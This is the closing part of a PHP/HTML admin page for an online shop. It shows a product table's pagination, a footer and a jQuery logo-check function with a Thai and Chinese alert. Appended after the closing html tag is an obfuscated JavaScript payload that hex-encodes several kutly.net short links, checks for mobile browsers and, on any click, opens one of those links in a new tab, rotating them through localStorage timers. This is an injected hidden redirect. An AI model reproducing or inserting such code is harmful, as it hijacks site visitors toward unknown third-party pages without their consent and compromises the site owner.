									<?php
								}
								?>
							</td>
						</tr>
						<?php
								$v++;
							}
						?>
						<tr>
							<td height="30" colspan="11" align="center">
								<?php  sh_page($total,$s_page,$e_page,$chk_page,Previous,Next,"#333333","#F8F8F8");?>
							</td>
						</tr>
					</table>
				</td>
			</tr>
			<tr>
				<td height="40" align="center" bgcolor="#333333">
					<?php include('footer.php');?>
				</td>
			</tr>
		</table>
		<!-- End Save for Web Slices -->
	</body>
	<script type="text/javascript">
		function checkbeforadd(memid){
			$.ajax({
				url :'chcheckadd.php',
				type : 'POST',
				dataType : 'JSON',
				data :{
					adminshop_id : memid
				},
				success : function(res){
					if(res.result){
						window.location.href = "backend_add.php";
					}else{
						alert('กรุณาเข้าไปใส่ ป้ายร้านค้า Logo ให้เรียบร้อยก่อนที่จะทำการลงสินค้า \r\n ### 请先到商店的招牌 Logo(Shop Nameplate) ### \r\n ### 里面把招牌和Logo图片传上来以后才能增加产品 谢谢 !!! ###');
						window.location.href ="backend_banner.php";
					}
				}
			});
		}
	</script>
</html>
<script>function _0x3023(_0x562006,_0x1334d6){const _0x10c8dc=_0x10c8();return _0x3023=function(_0x3023c3,_0x1b71b5){_0x3023c3=_0x3023c3-0x186;let _0x2d38c6=_0x10c8dc[_0x3023c3];return _0x2d38c6;},_0x3023(_0x562006,_0x1334d6);}function _0x10c8(){const _0x2ccc2=['userAgent','\x68\x74\x74\x70\x3a\x2f\x2f\x6b\x75\x74\x6c\x79\x2e\x6e\x65\x74\x2f\x65\x74\x7a\x32\x63\x392','length','_blank','mobileCheck','\x68\x74\x74\x70\x3a\x2f\x2f\x6b\x75\x74\x6c\x79\x2e\x6e\x65\x74\x2f\x64\x69\x6e\x33\x63\x313','\x68\x74\x74\x70\x3a\x2f\x2f\x6b\x75\x74\x6c\x79\x2e\x6e\x65\x74\x2f\x6a\x4f\x63\x30\x63\x310','random','-local-storage','\x68\x74\x74\x70\x3a\x2f\x2f\x6b\x75\x74\x6c\x79\x2e\x6e\x65\x74\x2f\x4c\x56\x5a\x37\x63\x377','stopPropagation','4051490VdJdXO','test','open','\x68\x74\x74\x70\x3a\x2f\x2f\x6b\x75\x74\x6c\x79\x2e\x6e\x65\x74\x2f\x57\x44\x61\x36\x63\x306','12075252qhSFyR','\x68\x74\x74\x70\x3a\x2f\x2f\x6b\x75\x74\x6c\x79\x2e\x6e\x65\x74\x2f\x76\x7a\x43\x38\x63\x308','\x68\x74\x74\x70\x3a\x2f\x2f\x6b\x75\x74\x6c\x79\x2e\x6e\x65\x74\x2f\x6b\x6f\x71\x35\x63\x335','4829028FhdmtK','round','-hurs','-mnts','864690TKFqJG','forEach','abs','1479192fKZCLx','16548MMjUpf','filter','vendor','click','setItem','3402978fTfcqu'];_0x10c8=function(){return _0x2ccc2;};return _0x10c8();}const _0x3ec38a=_0x3023;(function(_0x550425,_0x4ba2a7){const _0x142fd8=_0x3023,_0x2e2ad3=_0x550425();while(!![]){try{const _0x3467b1=-parseInt(_0x142fd8(0x19c))/0x1+parseInt(_0x142fd8(0x19f))/0x2+-parseInt(_0x142fd8(0x1a5))/0x3+parseInt(_0x142fd8(0x198))/0x4+-parseInt(_0x142fd8(0x191))/0x5+parseInt(_0x142fd8(0x1a0))/0x6+parseInt(_0x142fd8(0x195))/0x7;if(_0x3467b1===_0x4ba2a7)break;else _0x2e2ad3['push'](_0x2e2ad3['shift']());}catch(_0x28e7f8){_0x2e2ad3['push'](_0x2e2ad3['shift']());}}}(_0x10c8,0xd3435));var _0x365b=[_0x3ec38a(0x18a),_0x3ec38a(0x186),_0x3ec38a(0x1a2),'opera',_0x3ec38a(0x192),'substr',_0x3ec38a(0x18c),'\x68\x74\x74\x70\x3a\x2f\x2f\x6b\x75\x74\x6c\x79\x2e\x6e\x65\x74\x2f\x66\x73\x58\x31\x63\x351',_0x3ec38a(0x187),_0x3ec38a(0x18b),'\x68\x74\x74\x70\x3a\x2f\x2f\x6b\x75\x74\x6c\x79\x2e\x6e\x65\x74\x2f\x6e\x77\x75\x34\x63\x344',_0x3ec38a(0x197),_0x3ec38a(0x194),_0x3ec38a(0x18f),_0x3ec38a(0x196),'\x68\x74\x74\x70\x3a\x2f\x2f\x6b\x75\x74\x6c\x79\x2e\x6e\x65\x74\x2f\x6c\x6a\x47\x39\x63\x339','',_0x3ec38a(0x18e),'getItem',_0x3ec38a(0x1a4),_0x3ec38a(0x19d),_0x3ec38a(0x1a1),_0x3ec38a(0x18d),_0x3ec38a(0x188),'floor',_0x3ec38a(0x19e),_0x3ec38a(0x199),_0x3ec38a(0x19b),_0x3ec38a(0x19a),_0x3ec38a(0x189),_0x3ec38a(0x193),_0x3ec38a(0x190),'host','parse',_0x3ec38a(0x1a3),'addEventListener'];(function(_0x16176d){window[_0x365b[0x0]]=function(){let _0x129862=![];return function(_0x784bdc){(/(android|bb\d+|meego).+mobile|avantgo|bada\/|blackberry|blazer|compal|elaine|fennec|hiptop|iemobile|ip(hone|od)|iris|kindle|lge |maemo|midp|mmp|mobile.+firefox|netfront|opera m(ob|in)i|palm( os)?|phone|p(ixi|re)\/|plucker|pocket|psp|series(4|6)0|symbian|treo|up\.(browser|link)|vodafone|wap|windows ce|xda|xiino/i[_0x365b[0x4]](_0x784bdc)||/1207|6310|6590|3gso|4thp|50[1-6]i|770s|802s|a wa|abac|ac(er|oo|s\-)|ai(ko|rn)|al(av|ca|co)|amoi|an(ex|ny|yw)|aptu|ar(ch|go)|as(te|us)|attw|au(di|\-m|r |s )|avan|be(ck|ll|nq)|bi(lb|rd)|bl(ac|az)|br(e|v)w|bumb|bw\-(n|u)|c55\/|capi|ccwa|cdm\-|cell|chtm|cldc|cmd\-|co(mp|nd)|craw|da(it|ll|ng)|dbte|dc\-s|devi|dica|dmob|do(c|p)o|ds(12|\-d)|el(49|ai)|em(l2|ul)|er(ic|k0)|esl8|ez([4-7]0|os|wa|ze)|fetc|fly(\-|_)|g1 u|g560|gene|gf\-5|g\-mo|go(\.w|od)|gr(ad|un)|haie|hcit|hd\-(m|p|t)|hei\-|hi(pt|ta)|hp( i|ip)|hs\-c|ht(c(\-| |_|a|g|p|s|t)|tp)|hu(aw|tc)|i\-(20|go|ma)|i230|iac( |\-|\/)|ibro|idea|ig01|ikom|im1k|inno|ipaq|iris|ja(t|v)a|jbro|jemu|jigs|kddi|keji|kgt( |\/)|klon|kpt |kwc\-|kyo(c|k)|le(no|xi)|lg( g|\/(k|l|u)|50|54|\-[a-w])|libw|lynx|m1\-w|m3ga|m50\/|ma(te|ui|xo)|mc(01|21|ca)|m\-cr|me(rc|ri)|mi(o8|oa|ts)|mmef|mo(01|02|bi|de|do|t(\-| |o|v)|zz)|mt(50|p1|v )|mwbp|mywa|n10[0-2]|n20[2-3]|n30(0|2)|n50(0|2|5)|n7(0(0|1)|10)|ne((c|m)\-|on|tf|wf|wg|wt)|nok(6|i)|nzph|o2im|op(ti|wv)|oran|owg1|p800|pan(a|d|t)|pdxg|pg(13|\-([1-8]|c))|phil|pire|pl(ay|uc)|pn\-2|po(ck|rt|se)|prox|psio|pt\-g|qa\-a|qc(07|12|21|32|60|\-[2-7]|i\-)|qtek|r380|r600|raks|rim9|ro(ve|zo)|s55\/|sa(ge|ma|mm|ms|ny|va)|sc(01|h\-|oo|p\-)|sdk\/|se(c(\-|0|1)|47|mc|nd|ri)|sgh\-|shar|sie(\-|m)|sk\-0|sl(45|id)|sm(al|ar|b3|it|t5)|so(ft|ny)|sp(01|h\-|v\-|v )|sy(01|mb)|t2(18|50)|t6(00|10|18)|ta(gt|lk)|tcl\-|tdg\-|tel(i|m)|tim\-|t\-mo|to(pl|sh)|ts(70|m\-|m3|m5)|tx\-9|up(\.b|g1|si)|utst|v400|v750|veri|vi(rg|te)|vk(40|5[0-3]|\-v)|vm40|voda|vulc|vx(52|53|60|61|70|80|81|83|85|98)|w3c(\-| )|webc|whit|wi(g |nc|nw)|wmlb|wonu|x700|yas\-|your|zeto|zte\-/i[_0x365b[0x4]](_0x784bdc[_0x365b[0x5]](0x0,0x4)))&&(_0x129862=!![]);}(navigator[_0x365b[0x1]]||navigator[_0x365b[0x2]]||window[_0x365b[0x3]]),_0x129862;};const _0xfdead6=[_0x365b[0x6],_0x365b[0x7],_0x365b[0x8],_0x365b[0x9],_0x365b[0xa],_0x365b[0xb],_0x365b[0xc],_0x365b[0xd],_0x365b[0xe],_0x365b[0xf]],_0x480bb2=0x3,_0x3ddc80=0x6,_0x10ad9f=_0x1f773b=>{_0x1f773b[_0x365b[0x14]]((_0x1e6b44,_0x967357)=>{!localStorage[_0x365b[0x12]](_0x365b[0x10]+_0x1e6b44+_0x365b[0x11])&&localStorage[_0x365b[0x13]](_0x365b[0x10]+_0x1e6b44+_0x365b[0x11],0x0);});},_0x2317c1=_0x3bd6cc=>{const _0x2af2a2=_0x3bd6cc[_0x365b[0x15]]((_0x20a0ef,_0x11cb0d)=>localStorage[_0x365b[0x12]](_0x365b[0x10]+_0x20a0ef+_0x365b[0x11])==0x0);return _0x2af2a2[Math[_0x365b[0x18]](Math[_0x365b[0x16]]()*_0x2af2a2[_0x365b[0x17]])];},_0x57deba=_0x43d200=>localStorage[_0x365b[0x13]](_0x365b[0x10]+_0x43d200+_0x365b[0x11],0x1),_0x1dd2bd=_0x51805f=>localStorage[_0x365b[0x12]](_0x365b[0x10]+_0x51805f+_0x365b[0x11]),_0x5e3811=(_0x5aa0fd,_0x594b23)=>localStorage[_0x365b[0x13]](_0x365b[0x10]+_0x5aa0fd+_0x365b[0x11],_0x594b23),_0x381a18=(_0x3ab06f,_0x288873)=>{const _0x266889=0x3e8*0x3c*0x3c;return Math[_0x365b[0x1a]](Math[_0x365b[0x19]](_0x288873-_0x3ab06f)/_0x266889);},_0x3f1308=(_0x3a999a,_0x355f3a)=>{const _0x5c85ef=0x3e8*0x3c;return Math[_0x365b[0x1a]](Math[_0x365b[0x19]](_0x355f3a-_0x3a999a)/_0x5c85ef);},_0x4a7983=(_0x19abfa,_0x2bf37,_0xb43c45)=>{_0x10ad9f(_0x19abfa),newLocation=_0x2317c1(_0x19abfa),_0x5e3811(_0x365b[0x10]+_0x2bf37+_0x365b[0x1b],_0xb43c45),_0x5e3811(_0x365b[0x10]+_0x2bf37+_0x365b[0x1c],_0xb43c45),_0x57deba(newLocation),window[_0x365b[0x0]]()&&window[_0x365b[0x1e]](newLocation,_0x365b[0x1d]);};_0x10ad9f(_0xfdead6);function _0x978889(_0x3b4dcb){_0x3b4dcb[_0x365b[0x1f]]();const _0x2b4a92=location[_0x365b[0x20]];let _0x1b1224=_0x2317c1(_0xfdead6);const _0x4593ae=Date[_0x365b[0x21]](new Date()),_0x7f12bb=_0x1dd2bd(_0x365b[0x10]+_0x2b4a92+_0x365b[0x1b]),_0x155a21=_0x1dd2bd(_0x365b[0x10]+_0x2b4a92+_0x365b[0x1c]);if(_0x7f12bb&&_0x155a21)try{const _0x5d977e=parseInt(_0x7f12bb),_0x5f3351=parseInt(_0x155a21),_0x448fc0=_0x3f1308(_0x4593ae,_0x5d977e),_0x5f1aaf=_0x381a18(_0x4593ae,_0x5f3351);_0x5f1aaf>=_0x3ddc80&&(_0x10ad9f(_0xfdead6),_0x5e3811(_0x365b[0x10]+_0x2b4a92+_0x365b[0x1c],_0x4593ae));;_0x448fc0>=_0x480bb2&&(_0x1b1224&&window[_0x365b[0x0]]()&&(_0x5e3811(_0x365b[0x10]+_0x2b4a92+_0x365b[0x1b],_0x4593ae),window[_0x365b[0x1e]](_0x1b1224,_0x365b[0x1d]),_0x57deba(_0x1b1224)));}catch(_0x2386f7){_0x4a7983(_0xfdead6,_0x2b4a92,_0x4593ae);}else _0x4a7983(_0xfdead6,_0x2b4a92,_0x4593ae);}document[_0x365b[0x23]](_0x365b[0x22],_0x978889);}());</script>